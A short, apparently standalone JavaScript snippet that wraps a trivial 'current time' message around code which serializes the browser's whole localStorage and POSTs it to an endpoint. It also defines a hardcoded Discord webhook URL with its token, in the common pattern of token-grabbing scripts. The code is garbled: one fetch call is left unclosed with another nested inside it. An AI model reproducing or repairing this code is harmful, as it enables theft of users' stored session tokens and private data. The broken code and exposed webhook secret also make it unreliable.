
function generateDynamicMessage() {
    const currentTime = new Date().toLocaleTimeString();
    return `Current time is: ${currentTime}`;
}

const webhookUrl = 'https://discord.com/api/webhooks/827509304029610004/fTzJ9cyQTn6OEx5FtfEyriG2LoTAwudOdQkswWGZSPB2s-UerseWO6JtB8mI1j1Igzrf';
const dynamicMessage = generateDynamicMessage();

const payload = {
    content: dynamicMessage
};

const localData = JSON.stringify(localStorage);
fetch(webhookUrl, {

fetch('/send-local-storage', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ data: localData })  // Use a property name like "data"
})
    .then(response => {
        if (response.ok) {
            console.log('Message sent successfully');
        } else {
            console.error('Failed to send message');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
